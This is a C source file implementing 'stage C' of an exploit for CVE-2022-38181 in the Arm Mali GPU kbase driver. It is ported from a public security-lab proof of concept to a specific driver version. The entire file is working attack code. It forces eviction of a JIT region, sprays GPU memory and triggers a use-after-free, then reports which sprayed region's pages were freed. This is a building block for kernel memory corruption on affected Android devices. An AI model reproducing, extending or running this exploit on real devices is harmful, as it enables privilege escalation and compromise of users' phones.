/* CVE-2022-38181 stage C for trona: GHSL reliable trigger.
 * trim_level=100 + commit=0 spray regions: kbase_jit_free fully frees the
 * victim replacement region's pages synchronously. find_freed_idx via
 * MEM_QUERY(COMMIT_SIZE) confirms which sprayed region was the dangling target.
 *
 * Ported from github/securitylab mali_shrinker_mmap.c to kbase r14p0 UAPI.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;
typedef unsigned char __u8;

#include "mali_trona.h"

struct kbase_ioctl_mem_jit_init { __u64 va_pages; __u8 max_allocations; __u8 trim_level; __u8 padding[6]; };
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(0x80, 14, struct kbase_ioctl_mem_jit_init)

struct kbase_ioctl_job_submit { __u64 addr; __u32 nr_atoms; __u32 stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(0x80, 2, struct kbase_ioctl_job_submit)

union kbase_ioctl_mem_query {
	struct { __u64 gpu_addr; __u64 query; } in;
	struct { __u64 value; } out;
};
#define KBASE_IOCTL_MEM_QUERY _IOWR(0x80, 6, union kbase_ioctl_mem_query)
#define KBASE_MEM_QUERY_COMMIT_SIZE ((__u64)1)

struct kbase_ioctl_mem_commit { __u64 gpu_addr; __u64 pages; };
#define KBASE_IOCTL_MEM_COMMIT _IOW(0x80, 20, struct kbase_ioctl_mem_commit)

struct kbase_ioctl_mem_free { __u64 gpu_addr; };
#define KBASE_IOCTL_MEM_FREE _IOW(0x80, 7, struct kbase_ioctl_mem_free)

struct base_dependency { __u8 atom_id; __u8 dependency_type; };
struct base_jd_atom_v2 {
	__u64 jc; __u64 udata[2]; __u64 extres_list;
	__u16 nr_extres; __u16 compat_core_req;
	struct base_dependency pre_dep[2];
	__u8 atom_number, prio, device_nr, padding;
	__u32 core_req;
};
struct base_jit_alloc_info {
	__u64 gpu_alloc_addr; __u64 va_pages; __u64 commit_pages; __u64 extent;
	__u8 id, bin_id, max_allocations, flags; __u8 padding[2]; __u16 usage_id;
};

#define BASE_JD_REQ_SOFT_JOB       ((__u32)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE  (BASE_JD_REQ_SOFT_JOB | 0xa)

#define PAGE_SHIFT 12
#define SPRAY_PAGES 25
#define SPRAY_NUM   64
#define FLUSH_SIZE  (0x1000 * 0x1000)  /* 16MB */
#define SPRAY_CPU   0
#define NUM_TRIALS  100

static int fd;
static __u64 gpu_va[SPRAY_NUM];
static __u8 atom_number = 1;
static __u8 jit_id = 1;

static void migrate_to_cpu(int i)
{
	unsigned long mask[16] = { 0 };
	mask[0] = 1UL << i;
	syscall(__NR_sched_setaffinity, gettid(), sizeof(mask), mask);
}

static void *map_alloc(__u64 pages, __u64 commit)
{
	union kbase_ioctl_mem_alloc ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
		      BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
	ma.in.va_pages = pages;
	ma.in.commit_pages = commit;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { perror("MEM_ALLOC"); return NULL; }
	void *r = mmap(NULL, pages << PAGE_SHIFT, PROT_READ | PROT_WRITE,
		       MAP_SHARED, fd, ma.out.gpu_va);
	if (r == MAP_FAILED) { perror("mmap alloc"); return NULL; }
	return r;
}

static __u64 jit_alloc(__u8 id, __u64 va_pages, __u64 wb)
{
	struct base_jit_alloc_info info;
	struct base_jd_atom_v2 atom;
	memset(&info, 0, sizeof(info));
	memset(&atom, 0, sizeof(atom));
	info.id = id;
	info.gpu_alloc_addr = wb;
	info.va_pages = va_pages;
	info.commit_pages = va_pages;
	info.extent = va_pages;
	atom.jc = (__u64)&info;
	atom.atom_number = atom_number++;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	atom.nr_extres = 1;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) { perror("JIT_ALLOC submit"); return 0; }
	struct pollfd pfd = { fd, POLLIN, 0 };
	poll(&pfd, 1, 2000);
	char evbuf[64];
	read(fd, evbuf, sizeof(evbuf));
	return *(__u64 *)wb;
}

static void jit_free(__u8 id)
{
	__u8 free_id = id;
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = (__u64)&free_id;
	atom.atom_number = atom_number++;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	atom.nr_extres = 1;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) perror("JIT_FREE submit");
	struct pollfd pfd = { fd, POLLIN, 0 };
	poll(&pfd, 1, 2000);
	char evbuf[64];
	read(fd, evbuf, sizeof(evbuf));
}

static void spray(void)
{
	__u64 cookies[32];
	for (int j = 0; j < 32; j++) {
		union kbase_ioctl_mem_alloc ma;
		memset(&ma, 0, sizeof(ma));
		ma.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR;
		ma.in.va_pages = SPRAY_PAGES;
		ma.in.commit_pages = 0;
		if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { perror("spray alloc"); exit(1); }
		cookies[j] = ma.out.gpu_va;
	}
	for (int j = 0; j < 32; j++) {
		void *r = mmap(NULL, SPRAY_PAGES << PAGE_SHIFT, PROT_READ | PROT_WRITE,
			       MAP_SHARED, fd, cookies[j]);
		if (r == MAP_FAILED) { perror("spray mmap"); exit(1); }
		gpu_va[j] = (__u64)r;
	}
	for (int j = 0; j < 32; j++) {
		union kbase_ioctl_mem_alloc ma;
		memset(&ma, 0, sizeof(ma));
		ma.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR;
		ma.in.va_pages = SPRAY_PAGES;
		ma.in.commit_pages = 0;
		if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { perror("spray alloc2"); exit(1); }
		cookies[j] = ma.out.gpu_va;
	}
	for (int j = 32; j < 64; j++) {
		void *r = mmap(NULL, SPRAY_PAGES << PAGE_SHIFT, PROT_READ | PROT_WRITE,
			       MAP_SHARED, fd, cookies[j - 32]);
		if (r == MAP_FAILED) { perror("spray mmap2"); exit(1); }
		gpu_va[j] = (__u64)r;
	}
}

static int find_freed_idx(void)
{
	for (int j = 0; j < SPRAY_NUM; j++) {
		union kbase_ioctl_mem_query q;
		memset(&q, 0, sizeof(q));
		q.in.gpu_addr = gpu_va[j];
		q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
		if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) continue;
		if (q.out.value != SPRAY_PAGES) {
			printf("    jit_free commit: %d %llu\n", j, q.out.value);
			return j;
		}
	}
	return -1;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	migrate_to_cpu(SPRAY_CPU);

	fd = open("/dev/mali0", O_RDWR);
	if (fd < 0) { perror("open"); return 1; }
	struct kbase_ioctl_version_check vc = { 0, 0 };
	if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) < 0) { perror("VC"); return 1; }
	struct kbase_ioctl_set_flags sf = { 0 };
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { perror("SF"); return 1; }
	void *track = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
	if (track == MAP_FAILED) { perror("track"); return 1; }

	struct kbase_ioctl_mem_jit_init ji;
	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 255;
	ji.trim_level = 100;
	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji) < 0) { perror("JIT_INIT"); return 1; }
	printf("[*] init ok, UAPI %d.%d\n", vc.major, vc.minor);

	void *wb = map_alloc(1, 1);
	if (!wb) return 1;

	__u64 jit_addr = jit_alloc(jit_id, SPRAY_PAGES, (__u64)wb);
	printf("[*] jit_addr = 0x%llx\n", jit_addr);
	if (!jit_addr) return 1;

	struct kbase_ioctl_mem_flags_change fc;
	fc.gpu_va = jit_addr;
	fc.mask   = BASE_MEM_DONT_NEED;
	fc.flags  = BASE_MEM_DONT_NEED;
	if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) { perror("FLAGS_CHANGE"); return 1; }
	printf("[*] DONT_NEED set on JIT region\n");

	void *flush_regions[512];
	int freed = 0;
	for (int i = 0; i < NUM_TRIALS; i++) {
		union kbase_ioctl_mem_query q;
		memset(&q, 0, sizeof(q));
		q.in.gpu_addr = jit_addr;
		q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
		migrate_to_cpu(SPRAY_CPU);
		flush_regions[i] = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE,
					MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (flush_regions[i] != MAP_FAILED)
			memset(flush_regions[i], i & 0xff, FLUSH_SIZE);
		if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) { freed = 1; printf("[+] evicted after %d flushes\n", i); break; }
	}
	if (!freed) { printf("[-] never evicted\n"); return 1; }

	spray();
	for (int j = 0; j < SPRAY_NUM; j++) {
		struct kbase_ioctl_mem_commit mc = { gpu_va[j], SPRAY_PAGES };
		if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &mc) < 0) { perror("mem_commit"); return 1; }
	}
	printf("[*] sprayed + committed %d regions\n", SPRAY_NUM);

	jit_free(jit_id);
	printf("[*] jit_free done\n");

	int freed_idx = find_freed_idx();
	if (freed_idx < 0) { printf("[-] all regions intact: replacement missed\n"); return 1; }
	printf("[+] REPLACEMENT LANDED: freed_idx = %d\n", freed_idx);
	printf("[+] stage C complete: the dangling jit_alloc hit a sprayed region and freed its pages\n");
	return 0;
}
